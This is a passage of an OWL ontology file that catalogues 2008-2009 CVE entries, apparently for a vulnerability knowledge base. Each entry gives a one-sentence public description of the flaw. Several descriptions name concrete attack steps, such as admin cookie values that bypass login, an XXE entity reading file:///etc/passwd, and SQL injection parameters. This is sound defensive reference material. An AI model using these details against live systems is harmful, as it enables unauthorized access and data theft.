        rdfs:comment "SQL injection vulnerability in authpgsqllib.c in Courier-Authlib before 0.62.0, when a non-Latin locale Postgres database is used, allows remote attackers to execute arbitrary SQL commands via query parameters containing apostrophes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2433

    Annotations: 
        rdfs:comment "The web management console in Trend Micro OfficeScan 7.0 through 8.0, Worry-Free Business Security 5.0, and Client/Server/Messaging Suite 3.5 and 3.6 creates a random session token based only on the login time, which makes it easier for remote attackers to hijack sessions via brute-force attacks. NOTE: this can be leveraged for code execution through an unspecified \"manipulation of the configuration.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2575

    Annotations: 
        rdfs:comment "cbrPager before 0.9.17 allows user-assisted remote attackers to execute arbitrary commands via shell metacharacters in a (1) ZIP (aka .cbz) or (2) RAR (aka .cbr) archive filename."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2613

    Annotations: 
        rdfs:comment "Unspecified vulnerability in the Database Scheduler component in Oracle Database 10.2.0.4 and 11.1.0.6 has unknown impact and local attack vectors. NOTE: the previous information was obtained from the Oracle July 2008 CPU. Oracle has not commented on reliable researcher claims that this is an untrusted search path issue that allows local users to gain privileges via a malicious (1) libclntsh.so or (2) libnnz10.so library."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2790

    Annotations: 
        rdfs:comment "SQL injection vulnerability in detail.php in MountainGrafix easyTrade 2.x allows remote attackers to execute arbitrary SQL commands via the id parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2951

    Annotations: 
        rdfs:comment "Open redirect vulnerability in the search script in Trac before 0.10.5 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the q parameter, possibly related to the quickjump function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3060

    Annotations: 
        rdfs:comment "V-webmail 1.5.0 allows remote attackers to obtain sensitive information via (1) malformed input in the login page (includes/local.hooks.php) and (2) an invalid session ID, which reveals the installation path in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3174

    Annotations: 
        rdfs:comment "Unspecified vulnerability in the kmxfw.sys driver in CA Host-Based Intrusion Prevention System (HIPS) r8, as used in CA Internet Security Suite and Personal Firewall, allows remote attackers to cause a denial of service via unknown vectors, related to \"insufficient validation.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3177

    Annotations: 
        rdfs:comment "Sophos virus detection engine 2.75 on Linux and Unix, as used in Sophos Email Appliance, Pure Message for Unix, and Sophos Anti-Virus Interface (SAVI), allows remote attackers to cause a denial of service (engine crash) via zero-length MIME attachments."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3188

    Annotations: 
        rdfs:comment "libxcrypt in SUSE openSUSE 11.0 uses the DES algorithm when the configuration specifies the MD5 algorithm, which makes it easier for attackers to conduct brute-force attacks against hashed passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3289

    Annotations: 
        rdfs:comment "EMC Dantz Retrospect Backup Client 7.5.116 sends the password hash in cleartext at an unspecified point, which allows remote attackers to obtain sensitive information via a crafted packet."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3324

    Annotations: 
        rdfs:comment "The PartyGaming PartyPoker client program 121/120 does not properly verify the authenticity of updates, which allows remote man-in-the-middle attackers to execute arbitrary code via a Trojan horse update."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3424

    Annotations: 
        rdfs:comment "Condor before 7.0.4 does not properly handle wildcards in the ALLOW_WRITE, DENY_WRITE, HOSTALLOW_WRITE, or HOSTDENY_WRITE configuration variables in authorization policy lists, which might allow remote attackers to bypass intended access restrictions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3438

    Annotations: 
        rdfs:comment "Apple Mac OS X does not properly verify the authenticity of updates, which allows man-in-the-middle attackers to execute arbitrary code via a Trojan horse update, as demonstrated by evilgrade and DNS cache poisoning."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3464

    Annotations: 
        rdfs:comment "afd.sys in the Ancillary Function Driver (AFD) component in Microsoft Windows XP SP2 and SP3 and Windows Server 2003 SP1 and SP2 does not properly validate input sent from user mode to the kernel, which allows local users to gain privileges via a crafted application, as demonstrated using crafted pointers and lengths that bypass intended ProbeForRead and ProbeForWrite restrictions, aka \"AFD Kernel Overwrite Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3477

    Annotations: 
        rdfs:comment "Microsoft Excel 2000 SP3, 2002 SP3, and 2003 SP2 and SP3 does not properly validate data in the VBA Performance Cache when processing an Office document with an embedded object, which allows remote attackers to execute arbitrary code via an Excel file containing a crafted value, leading to heap-based buffer overflows, integer overflows, array index errors, and memory corruption, aka \"Calendar Object Validation Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3485

    Annotations: 
        rdfs:comment "Untrusted search path vulnerability in Citrix MetaFrame Presentation Server allows local users to gain privileges via a malicious icabar.exe placed in the search path."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3494

    Annotations: 
        rdfs:comment "8e6 R3000 Internet Filter 2.0.12.10 allows remote attackers to bypass intended restrictions via an extra HTTP Host header with additional leading text placed before the real Host header."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3571

    Annotations: 
        rdfs:comment "The Xerox Phaser 8400 allows remote attackers to cause a denial of service (reboot) via an empty UDP packet to port 1900."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3612

    Annotations: 
        rdfs:comment "The Networking subsystem in Apple iPod touch 2.0 through 2.0.2, and iPhone 2.0 through 2.0.2, uses predictable TCP initial sequence numbers, which allows remote attackers to spoof or hijack a TCP connection."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3660

    Annotations: 
        rdfs:comment "PHP 4.4.x before 4.4.9, and 5.x through 5.2.6, when used as a FastCGI module, allows remote attackers to cause a denial of service (crash) via a request with multiple dots preceding the extension, as demonstrated using foo..php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3680

    Annotations: 
        rdfs:comment "The decryption function in Flagship Industries Ventrilo 3.0.2 and earlier allows remote attackers to cause a denial of service (NULL pointer dereference and server crash) by sending a type 0 packet with an invalid version followed by another packet to TCP port 3784."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3775

    Annotations: 
        rdfs:comment "Folder Lock 5.9.5 and earlier uses weak encryption (ROT-25) for the password, which allows local administrators to obtain sensitive information by reading and decrypting the QualityControl\\_pack registry value."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3812

    Annotations: 
        rdfs:comment "Cisco IOS 12.4, when IOS firewall Application Inspection Control (AIC) with HTTP Deep Packet Inspection is enabled, allows remote attackers to cause a denial of service (device reload) via a malformed HTTP transit packet."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-3843

    Annotations: 
        rdfs:comment "Request Validation (aka the ValidateRequest filters) in ASP.NET in Microsoft .NET Framework with the MS07-040 update does not properly detect dangerous client input, which allows remote attackers to conduct cross-site scripting (XSS) attacks, as demonstrated by a query string containing a \"<~/\" (less-than tilde slash) sequence followed by a crafted STYLE element."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4114

    Annotations: 
        rdfs:comment "srv.sys in the Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via an SMB WRITE_ANDX packet with an offset that is inconsistent with the packet size, related to \"insufficiently validating the buffer size,\" as demonstrated by a request to the \\PIPE\\lsarpc named pipe, aka \"SMB Validation Denial of Service Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4122

    Annotations: 
        rdfs:comment "Joomla! 1.5.8 does not set the secure flag for the session cookie in an https session, which makes it easier for remote attackers to capture this cookie by intercepting its transmission within an http session."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4302

    Annotations: 
        rdfs:comment "fs/splice.c in the splice subsystem in the Linux kernel before 2.6.22.2 does not properly handle a failure of the add_to_page_cache_lru function, and subsequently attempts to unlock a page that was not locked, which allows local users to cause a denial of service (kernel BUG and system crash), as demonstrated by the fio I/O tool."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4304

    Annotations: 
        rdfs:comment "general/login.php in phpCollab 2.5 rc3 and earlier allows remote attackers to execute arbitrary commands via shell metacharacters in unspecified input related to the SSL_CLIENT_CERT environment variable. NOTE: in some environments, SSL_CLIENT_CERT always has a base64-encoded string value, which may impose constraints on injection for typical shells."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4315

    Annotations: 
        rdfs:comment "tog-pegasus in OpenGroup Pegasus 2.7.0 on Red Hat Enterprise Linux (RHEL) 5, Fedora 9, and Fedora 10 does not log failed authentication attempts to the OpenPegasus CIM server, which makes it easier for remote attackers to avoid detection of password guessing attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4390

    Annotations: 
        rdfs:comment "The Cisco Linksys WVC54GC wireless video camera before firmware 1.25 sends cleartext configuration data in response to a Setup Wizard remote-management command, which allows remote attackers to obtain sensitive information such as passwords by sniffing the network."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4577

    Annotations: 
        rdfs:comment "The ACL plugin in Dovecot before 1.1.4 treats negative access rights as if they are positive access rights, which allows attackers to bypass intended access restrictions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4638

    Annotations: 
        rdfs:comment "qioadmin in the Quick I/O for Database feature in Symantec Veritas File System (VxFS) on HP-UX, and before 5.0 MP3 on Solaris, Linux, and AIX, allows local users to read arbitrary files by causing qioadmin to write a file's content to standard error in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4679

    Annotations: 
        rdfs:comment "The Web Services Security component in IBM WebSphere Application Server (WAS) 6.0.2 before 6.0.2.31 and 6.1 before 6.1.0.19, when Certificate Store Collections is configured to use Certificate Revocation Lists (CRL), does not call the setRevocationEnabled method on the PKIXBuilderParameters object, which prevents the \"Java security method\" from checking the revocation status of X.509 certificates and allows remote attackers to bypass intended access restrictions via a SOAP message with a revoked certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4730

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in MyID.php in phpMyID 0.9 allows remote attackers to inject arbitrary web script or HTML via the openid_trust_root parameter and an inconsistent openid_return_to parameter, which is not properly handled in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4752

    Annotations: 
        rdfs:comment "TlNews 2.2 allows remote attackers to bypass authentication and gain administrative access by setting the tlNews_login cookie to admin."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4796

    Annotations: 
        rdfs:comment "The _httpsrequest function (Snoopy/Snoopy.class.php) in Snoopy 1.2.3 and earlier, as used in (1) ampache, (2) libphp-snoopy, (3) mahara, (4) mediamate, (5) opendb, (6) pixelpost, and possibly other products, allows remote attackers to execute arbitrary commands via shell metacharacters in https URLs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4822

    Annotations: 
        rdfs:comment "Adobe Flash Player 9.0.124.0 and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4905

    Annotations: 
        rdfs:comment "Typo 5.1.3 and earlier uses a hard-coded salt for calculating password hashes, which makes it easier for attackers to guess passwords via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4929

    Annotations: 
        rdfs:comment "MyBB (aka MyBulletinBoard) 1.4.2 uses insufficient randomness to compose filenames of uploaded files used as attachments, which makes it easier for remote attackers to read these files by guessing filenames."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-4989

    Annotations: 
        rdfs:comment "The _gnutls_x509_verify_certificate function in lib/x509/verify.c in libgnutls in GnuTLS before 2.6.1 trusts certificate chains in which the last certificate is an arbitrary trusted, self-signed certificate, which allows man-in-the-middle attackers to insert a spoofed certificate for any Distinguished Name (DN)."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5027

    Annotations: 
        rdfs:comment "The Nagios process in (1) Nagios before 3.0.5 and (2) op5 Monitor before 4.0.1 allows remote authenticated users to bypass authorization checks, and trigger execution of arbitrary programs by this process, via an (a) custom form or a (b) browser addon."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5065

    Annotations: 
        rdfs:comment "TlGuestBook 1.2 allows remote attackers to bypass authentication and gain administrative access by setting the tlGuestBook_login cookie to admin."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5071

    Annotations: 
        rdfs:comment "Multiple eval injection vulnerabilities in itpm_estimate.php in Yoxel 1.23beta and earlier allow remote authenticated users to execute arbitrary PHP code via the proj_id parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5080

    Annotations: 
        rdfs:comment "awstats.pl in AWStats 6.8 and earlier does not properly remove quote characters, which allows remote attackers to conduct cross-site scripting (XSS) attacks via the query_string parameter. NOTE: this issue exists because of an incomplete fix for CVE-2008-3714."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5125

    Annotations: 
        rdfs:comment "admin.php in CCleague Pro 1.2 allows remote attackers to bypass authentication by setting the type cookie value to admin."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5162

    Annotations: 
        rdfs:comment "The arc4random function in the kernel in FreeBSD 6.3 through 7.1 does not have a proper entropy source for a short time period immediately after boot, which makes it easier for attackers to predict the function's return values and conduct certain attacks against the GEOM framework and various network protocols, related to the Yarrow random number generator."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5180

    Annotations: 
        rdfs:comment "Microsoft Communicator, and Communicator in Microsoft Office 2010 beta, allows remote attackers to cause a denial of service (memory consumption) via a large number of SIP INVITE requests, which trigger the creation of many sessions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5249

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in MediaWiki 1.13.0 through 1.13.2 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5285

    Annotations: 
        rdfs:comment "Wireshark 1.0.4 and earlier allows remote attackers to cause a denial of service via a long SMTP request, which triggers an infinite loop."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5305

    Annotations: 
        rdfs:comment "Eval injection vulnerability in TWiki before 4.2.4 allows remote attackers to execute arbitrary Perl code via the %SEARCH{}% variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5563

    Annotations: 
        rdfs:comment "Aruba Mobility Controller 2.4.8.x-FIPS, 2.5.x, 3.1.x, 3.2.x, 3.3.1.x, and 3.3.2.x allows remote attackers to cause a denial of service (device crash) via a malformed Extensible Authentication Protocol (EAP) frame."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5642

    Annotations: 
        rdfs:comment "Directory traversal vulnerability in admin/login.php in CMS Made Simple 1.4.1 allows remote attackers to read arbitrary files via a .. (dot dot) in a cms_language cookie."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5734

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in WebMail Pro in IceWarp Software Merak Mail Server 9.3.2 allows remote attackers to inject arbitrary web script or HTML via an IMG element in an HTML e-mail message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5738

    Annotations: 
        rdfs:comment "Nodstrum MySQL Calendar 1.1 and 1.2 allows remote attackers to bypass authentication and gain administrative access by setting the nodstrumCalendarV2 cookie to 1. NOTE: some of these details are obtained from third party information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5748

    Annotations: 
        rdfs:comment "Directory traversal vulnerability in plugins/spaw2/dialogs/dialog.php in BloofoxCMS 0.3.4 allows remote attackers to read arbitrary files via the (1) lang, (2) theme, and (3) module parameters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5764

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in calendar.php in WorkSimple 1.2.1, when register_globals is enabled, allows remote attackers to execute arbitrary PHP code via a URL in the lang parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5770

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in config/make_config.php in PHP Weather 2.2.2 allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5784

    Annotations: 
        rdfs:comment "V3 Chat - Profiles/Dating Script 3.0.2 allows remote attackers to bypass authentication and gain administrative access by setting the admin cookie to 1."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-5817

    Annotations: 
        rdfs:comment "Multiple SQL injection vulnerabilities in index.php in Web Scribble Solutions webClassifieds 2005 allow remote attackers to execute arbitrary SQL commands via the (1) user and (2) password fields in a sign_in action."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6123

    Annotations: 
        rdfs:comment "The netsnmp_udp_fmtaddr function (snmplib/snmpUDPDomain.c) in net-snmp 5.0.9 through 5.4.2.1, when using TCP wrappers for client authorization, does not properly parse hosts.allow rules, which allows remote attackers to bypass intended access restrictions and execute SNMP queries, related to \"source/destination IP address confusion.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6157

    Annotations: 
        rdfs:comment "SepCity Classified Ads stores the admin password in cleartext in data/classifieds.mdb, which allows context-dependent attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6291

    Annotations: 
        rdfs:comment "Acc PHP eMail 1.1 allows remote attackers to bypass authentication and gain administrative access by setting the NEWSLETTERLOGIN cookie to \"admin\"."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6548

    Annotations: 
        rdfs:comment "The rst parser (parser/text_rst.py) in MoinMoin 1.6.1 does not check the ACL of an included page, which allows attackers to read unauthorized include files via unknown vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6827

    Annotations: 
        rdfs:comment "The ListView control in the Client GUI (AClient.exe) in Symantec Altiris Deployment Solution 6.x before 6.9.355 SP1 allows local users to gain SYSTEM privileges and execute arbitrary commands via a \"Shatter\" style attack on the \"command prompt\" hidden GUI button to (1) overwrite the CommandLine parameter to cmd.exe to use SYSTEM privileges and (2) modify the DLL that is loaded using the LoadLibrary API function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-6828

    Annotations: 
        rdfs:comment "Symantec Altiris Deployment Solution 6.x before 6.9.355 SP1 stores the Application Identity Account password in memory in cleartext, which allows local users to gain privileges and modify clients of the Deployment Solution Server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-7109

    Annotations: 
        rdfs:comment "The Scanner File Utility (aka listener) in Kyocera Mita (KM) 3.3.0.1 allows remote attackers to bypass authorization and upload arbitrary files to the client system via a modified program that does not prompt the user for a password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0034

    Annotations: 
        rdfs:comment "parse.c in sudo 1.6.9p17 through 1.6.9p19 does not properly interpret a system group (aka %group) in the sudoers file during authorization decisions for a user who belongs to that group, which allows local users to leverage an applicable sudoers file and gain root privileges via a sudo command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0037

    Annotations: 
        rdfs:comment "The redirect implementation in curl and libcurl 5.11 through 7.19.3, when CURLOPT_FOLLOWLOCATION is enabled, accepts arbitrary Location values, which might allow remote HTTP servers to (1) trigger arbitrary requests to intranet servers, (2) read or overwrite arbitrary files via a redirect to a file: URL, or (3) execute arbitrary commands via a redirect to an scp: URL."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0115

    Annotations: 
        rdfs:comment "The Device Mapper multipathing driver (aka multipath-tools or device-mapper-multipath) 0.4.8, as used in SUSE openSUSE, SUSE Linux Enterprise Server (SLES), Fedora, and possibly other operating systems, uses world-writable permissions for the socket file (aka /var/run/multipathd.sock), which allows local users to send arbitrary commands to the multipath daemon."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0124

    Annotations: 
        rdfs:comment "The tqsl_verifyDataBlock function in openssl_cert.cpp in American Radio Relay League (ARRL) tqsllib 2.0 does not properly check the return value from the OpenSSL EVP_VerifyFinal function, which allows remote attackers to bypass validation of the certificate chain via a malformed SSL/TLS signature, a similar vulnerability to CVE-2008-5077."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0141

    Annotations: 
        rdfs:comment "XTerm in Apple Mac OS X 10.4.11 and 10.5.6, when used with luit, creates tty devices with insecure world-writable permissions, which allows local users to write to the Xterm of another user."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0152

    Annotations: 
        rdfs:comment "iChat in Apple Mac OS X 10.5 before 10.5.7 disables SSL for AOL Instant Messenger (AIM) communication in certain circumstances that are inconsistent with the Require SSL setting, which allows remote attackers to obtain sensitive information by sniffing the network."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0161

    Annotations: 
        rdfs:comment "The OpenSSL::OCSP module for Ruby in Apple Mac OS X 10.5 before 10.5.7 misinterprets an unspecified invalid response as a successful OCSP certificate validation, which might allow remote attackers to spoof certificate authentication via a revoked certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0255

    Annotations: 
        rdfs:comment "The System extension Install tool in TYPO3 4.0.0 through 4.0.9, 4.1.0 through 4.1.7, and 4.2.0 through 4.2.3 creates the encryption key with an insufficiently random seed, which makes it easier for attackers to crack the key."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0265

    Annotations: 
        rdfs:comment "Internet Systems Consortium (ISC) BIND 9.6.0 and earlier does not properly check the return value from the OpenSSL EVP_VerifyFinal function, which allows remote attackers to bypass validation of the certificate chain via a malformed SSL/TLS signature, a similar vulnerability to CVE-2008-5077 and CVE-2009-0025."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0642

    Annotations: 
        rdfs:comment "ext/openssl/ossl_ocsp.c in Ruby 1.8 and 1.9 does not properly check the return value from the OCSP_basic_verify function, which might allow remote attackers to successfully present an invalid X.509 certificate, possibly involving a revoked certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0864

    Annotations: 
        rdfs:comment "S-Cms 1.1 Stable allows remote attackers to bypass authentication and obtain administrative access via an OK value for the login cookie."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-0964

    Annotations: 
        rdfs:comment "UserView_list.php in PHPRunner 4.2, and possibly earlier, stores passwords in cleartext in the database, which allows attackers to gain privileges. NOTE: this can be leveraged with a separate SQL injection vulnerability to obtain passwords remotely without authentication."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1048

    Annotations: 
        rdfs:comment "The web interface on the snom VoIP phones snom 300, snom 320, snom 360, snom 370, and snom 820 with firmware 6.5 before 6.5.20, 7.1 before 7.1.39, and 7.3 before 7.3.14 allows remote attackers to bypass authentication, and reconfigure the phone or make arbitrary use of the phone, via a (1) http or (2) https request with 127.0.0.1 in the Host header."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1073

    Annotations: 
        rdfs:comment "nss-ldapd before 0.6.8 uses world-readable permissions for the /etc/nss-ldapd.conf file, which allows local users to obtain a cleartext password for the LDAP server by reading the bindpw field."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1283

    Annotations: 
        rdfs:comment "glFusion before 1.1.3 performs authentication with a user-provided password hash instead of a password, which allows remote attackers to gain privileges by obtaining the hash and using it in the glf_password cookie, aka \"User Masquerading.\" NOTE: this can be leveraged with a separate SQL injection vulnerability to steal hashes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1358

    Annotations: 
        rdfs:comment "apt-get in apt before 0.7.21 does not check for the correct error code from gpgv, which causes apt to treat a repository as valid even when it has been signed with a key that has been revoked or expired, which might allow remote attackers to trick apt into installing malicious repositories."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1466

    Annotations: 
        rdfs:comment "Application Access Server (A-A-S) 2.0.48 stores (1) passwords and (2) the port keyword in cleartext in aas.ini, which allows local users to obtain sensitive information by reading this file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1549

    Annotations: 
        rdfs:comment "AGTC MyShop 3.2b allows remote attackers to bypass authentication and obtain administrative access setting the log_accept cookie to \"correcto.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1596

    Annotations: 
        rdfs:comment "Ignite Realtime Openfire before 3.6.5 does not properly implement the register.password (aka canChangePassword) console configuration setting, which allows remote authenticated users to bypass intended policy and change their own passwords via a passwd_change IQ packet."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1603

    Annotations: 
        rdfs:comment "src/tools/pkcs11-tool.c in pkcs11-tool in OpenSC 0.11.7, when used with unspecified third-party PKCS#11 modules, generates RSA keys with incorrect public exponents, which allows attackers to read the cleartext form of messages that were intended to be encrypted."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1619

    Annotations: 
        rdfs:comment "Teraway FileStream 1.0 allows remote attackers to bypass authentication and gain administrative access by setting the twFSadmin cookie to 1."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-1699

    Annotations: 
        rdfs:comment "The XSL stylesheet implementation in WebKit in Apple Safari before 4.0, iPhone OS 1.0 through 2.2.1, and iPhone OS for iPod touch 1.1 through 2.2.1 does not properly handle XML external entities, which allows remote attackers to read arbitrary files via a crafted DTD, as demonstrated by a file:///etc/passwd URL in an entity declaration, related to an \"XXE attack.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2054

    Annotations: 
        rdfs:comment "Cisco Unified Communications Manager (aka CUCM, formerly CallManager) 4.x, 5.x before 5.1(3g), 6.x before 6.1(4), 7.0 before 7.0(2a)su1, and 7.1 before 7.1(2a)su1 allows remote attackers to cause a denial of service (file-descriptor exhaustion and SIP outage) via a flood of TCP packets, aka Bug ID CSCsx23689."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2158

    Annotations: 
        rdfs:comment "account-recover.php in TorrentTrader Classic 1.09 chooses random passwords from an insufficiently large set, which makes it easier for remote attackers to obtain a password via a brute-force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2168

    Annotations: 
        rdfs:comment "cpanel in EgyPlus 7ammel (aka 7ml) 1.0.1 and earlier sends a redirect to the web browser but does not exit when the supplied credentials are incorrect, which allows remote attackers to bypass authentication by providing arbitrary username and password parameters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2213

    Annotations: 
        rdfs:comment "The default configuration of the Security global settings on the Citrix NetScaler Access Gateway appliance with Enterprise Edition firmware 9.0, 8.1, and earlier specifies Allow for the Default Authorization Action option, which might allow remote authenticated users to bypass intended access restrictions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2272

    Annotations: 
        rdfs:comment "The Huawei D100 stores the administrator's account name and password in cleartext in a cookie, which allows context-dependent attackers to obtain sensitive information by (1) reading a cookie file, by (2) sniffing the network for HTTP headers, and possibly by using unspecified other vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2282

    Annotations: 
        rdfs:comment "The Virtual Network Terminal Server daemon (vntsd) for Logical Domains (aka LDoms) in Sun Solaris 10, and OpenSolaris snv_41 through snv_108, on SPARC platforms does not check authorization for guest console access, which allows local control-domain users to gain guest-domain privileges via unknown vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2367

    Annotations: 
        rdfs:comment "cgi-bin/makecgi-pro in Iomega StorCenter Pro generates predictable session IDs, which allows remote attackers to hijack active sessions and gain privileges via brute force guessing attacks on the session_id parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2382

    Annotations: 
        rdfs:comment "admin script allows authentication bypass by setting a cookie value to \"LOGGEDIN\"."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2408

    Annotations: 
        rdfs:comment "Mozilla Network Security Services (NSS) before 3.12.3, Firefox before 3.0.13, Thunderbird before 2.0.0.23, and SeaMonkey before 1.1.18 do not properly handle a '\\0' character in a domain name in the subject's Common Name (CN) field of an X.509 certificate, which allows man-in-the-middle attackers to spoof arbitrary SSL servers via a crafted certificate issued by a legitimate Certification Authority. NOTE: this was originally reported for Firefox before 3.5."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2422

    Annotations: 
